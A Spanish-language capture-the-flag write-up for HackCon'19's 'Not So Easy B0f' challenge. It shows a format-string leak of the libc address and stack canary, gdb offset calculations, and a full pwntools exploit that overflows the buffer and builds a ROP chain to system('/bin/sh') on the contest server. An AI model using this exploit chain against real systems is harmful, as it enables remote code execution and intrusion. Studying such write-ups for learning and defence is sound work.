
# Not So Easy B0f (HackCon'19)
## Descripción
```
I have stack canaries enabled, Can you still B0f me ? Service : nc 68.183.158.95 8991
```
## Solución
Además del enunciado se incluyen un **binario** y una **biblioteca: q3 y libc.so.6**
```bash
$ file q3
q3: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3cd41764dce3415f6d1f0c5d5e27edb759d0798e, not stripped
$ checksec q3
[*] '/root/Documents/Personal/CTF/HackCon19/Not_So_Easy_B0f/q3'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
$ ./q3                             
Enter name : AAAA
Hello
AAAA
Enter sentence : AAAA
$ md5sum * | grep `md5sum /tmp/libc.so.6 | awk '{print $1}'`
8c0d248ea33e6ef17b759fa5d81dda9e  libc6_2.23-0ubuntu11_amd64.so
```
En este caso nos enfrentamos a un binario con **canario, NX y PIE.** Y la libc corresponde con la de un [Ubuntu Xenial](https://ubuntu.pkgs.org/16.04/ubuntu-updates-main-amd64/libc6_2.23-0ubuntu11_amd64.deb.html) así que utilice un vps de dicho sistema operativo.

Lo abrimos con IDA y obtenemos el siguiente código fuente:
Tras abrir el binario (**q3**) con IDA y "limpiar" un poco el **pseudo-c** obtenemos la siguiente función main que nos ayudará a entender cómo vulnerar este programa:
```c
int main(int argc, const char **argv)
{
  char s[8];

  printf("Enter name : ");
  fgets(s, 16, stdin);
  puts("Hello");
  printf(s, 16);
  printf("Enter sentence : ");
  fgets(s, 256, stdin);
  return 0;
}
```
* Tras el **fgets** se comprueba el canario:
```
    0x0000081a      488b4df8       mov rcx, qword [canary]
    0x0000081e      6448330c2528.  xor rcx, qword fs:[0x28]
    0x00000827      7405           je 0x82e
    0x00000829      e802feffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
```
A simple vista vemos un **format string** en la linea `printf(s, 16);` y un **buffer overflow** en `fgets(s, 256, stdin);` veamos si podemos leakear el canario y el offset de la libc ya que el **ASLR** está activado.

Como el **fgets** solo recoge 16 caracteres así que vamos a user un **fuzzer**:


```python
#!/usr/bin/env python
from pwn import *

e = ELF("./q3")

for i in range(20):
        io = e.process(level="error")
        io.sendline("AAAA %%%d$lx" % i)
        io.recvline()
        print("%d - %s" % (i, io.recvline().strip()))
        io.close()
```

Out:
```
0 - AAAA %0$lx                                                                                        
1 - AAAA 56029be1e010                                                                                 
2 - AAAA 7f84ddb19780                                                                                 
3 - AAAA 7f902807d2c0                                                                                 
4 - AAAA 7f1b8aed0700                                                                                 
5 - AAAA 0                                                                                            
6 - AAAA 7ffc5d103eae                                                                                 
7 - AAAA 7f0219f288e0                                                                                 
8 - AAAA 2438252041414141                                                                             
9 - AAAA a786c                                                                                        
10 - AAAA 7ffc1bb38f60                                                                                
11 - AAAA 36ddf28abc7d1800                                                                            
12 - AAAA 55b9f155e830                                                                                
13 - AAAA 7fd65f6e6830                                                                                
14 - AAAA 1                                                                                           
15 - AAAA 7fff71b19528                                                                                
16 - AAAA 1e357fca0                                                                                   
17 - AAAA 55e8ca16477a                                                                                
18 - AAAA 0                                                                                           
19 - AAAA 288a7d584b85d47e
```

En la octava salida vemos las 4 As que hemos introducido **(0x41414141)** luego podremos ser capaces de **'sobreescribir'** direcciones de memoria, las salidas que empizan por **0x7f** corresponden con direcciones de memoria de la libc luego podremos leakear para calcular el offset **(ASLR)** y las salidas 11 y 19 parecen ser el **canary**.

Sabiendo esto, podemos trazar el plan:
1. Leakear una dirección de la libc y comprobar el offset.
2. Descubrir si la salida 11 o 19 corresponden con el canary.

## LIBC LEAK
Usando gdb vamos a leakear una dirección de la libc **(%2$lx)** y buscar el offset de dicha salida:

```gdb
gdb-peda$ r                                                                                           
Starting program: /root/q3                                                                            
Enter name : %2$lx                                                                                    
Hello                                                                                                 
7ffff7dd3780                                                                                          
Enter sentence : ^C                                                                                   
Program received signal SIGINT, Interrupt.
gdb-peda$ vmmap
Start              End                Perm      Name
[...]
0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp      /lib/x86_64-linux-gnu/libc-2.23.so
[...]
gdb-peda$ p/x 0x07ffff7dd3780 - 0x07ffff7a0d000
$3 = 0x3c6780
```

Ejecutamos el programa introduciendo **%2$lx** y obtenemos la dirección de memoria: **0x07ffff7dd3780**, ahora miramos con **vmmap** el comienzo de la **libc: 0x07ffff7a0d000**.

Calculando la diferencia entre ambas direcciones obtendremos el offset de la segunda dirección que leakeamos y así podremos calcular en tiempo de ejecución la dirección de la libc bypasseando el **ASLR**: `0x07ffff7dd3780 - 0x07ffff7a0d000 = 0x3c6780`.

## CANARY
Para calcular si el canario corresponde con la salida 11 o 19 del **format string** podemos usar **gdb** de nuevo. Basta con introducir **%11$lx y %19$lx** y comprobar, con un breakpoint, el valor del canario. Si coincide con alguno de los dos, ya podremos leakear facilmente el canario.
### Salida 11
```gdb
gdb-peda$ b * 0x55555555481e
Breakpoint 1 at 0x55555555481e
gdb-peda$ r
Starting program: /root/q3 
Enter name : %11$lx
Hello
89e2b68ae1c23f00
Enter sentence : A

Breakpoint 1, 0x000055555555481e in main ()
gdb-peda$ p $rcx                                                                                  
$2 = 0x89e2b68ae1c23f00
```

### Salida 19

```gdb
gdb-peda$ b * 0x55555555481e
Breakpoint 1 at 0x55555555481e
gdb-peda$ r
Starting program: /root/q3 
Enter name : %19$lx
Hello
e68e481756df87b0
Enter sentence : A

Breakpoint 1, 0x000055555555481e in main ()
gdb-peda$ p $rcx
$1 = 0xe83180cc88975d00
```

Como veis, con la salida 11 leakeamos el valor del canario. 

### Bypass Canary
Ahora vamos a ver el relleno hasta llegar al canario para poder escribir el valor correcto.
```gdb
gdb-peda$ pattern_create 64
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH'
gdb-peda$ r                                                                                           
Starting program: /root/q3                                                                            
Enter name : A                                                                                        
Hello                                                                                                 
A                                                                                                     
Enter sentence : AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH
gdb-peda$ p $rcx
$4 = 0x413b414144414128
gdb-peda$ pattern offset 0x413b414144414128
4700422384665051432 found at offset: 24
```
El offset es **24 bytes.**

### Calcular relleno
Ahora solo queda calcular el relleno entre el canario y la direccion de retorno. Para ello basta con abrir gdb, establecer un breakpoint en la misma instruccion que antes (**0x000055555555481e**), introduccir `%11$lx` y 
`"A"*24 + "B"*8 + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A"` y una vez en el breakpoint modificar el valor del **RCX** con el del canario.

```gdb
gdb-peda$ r                                                                                           
Starting program: /root/q3                                                                            
Enter name : %11$lx                                                                                   
Hello                                                                                                 
6cf965dc5ce99a00                                                                                      
Enter sentence : AAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A
Breakpoint 1, 0x000055555555481e in main ()
gdb-peda$ set $rcx=0x6cf965dc5ce99a00
gdb-peda$ c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
gdb-peda$ x/wx $rsp
0x7fffffffe5d8: 0x33614132

$ msf-pattern_offset -q 0x33614132
[*] Exact match at offset 8
```

Obtenemos un offset de **8 bytes**.
Ahora podemos fácilmente crear un exploit:



```python
#!/usr/bin/env python
from pwn import *

e = ELF('q3')
libc = ELF('libc.so.6', checksec=False)

io = remote('68.183.158.95', 8991)

io.sendline('%2$lx-%11$lx')
io.recvline()
leak = io.recvline()
libc.address = int(leak.strip().split('-')[0], 16) - 0x3c6780
canary = int(leak.strip().split('-')[1], 16)

log.info("Libc: %s" % hex(libc.address))
log.info("Canary: %s" % hex(canary))

payload = flat(
        "A"*24,
        canary, 
        "A"*8,
        libc.address + 0x0000000000021102, # pop rdi; ret
        next(libc.search('/bin/sh')),
        libc.sym['system'],
        endianness = 'little', word_size = 64, sign = False)

io.recv()
io.sendline(payload)
io.interactive()
```
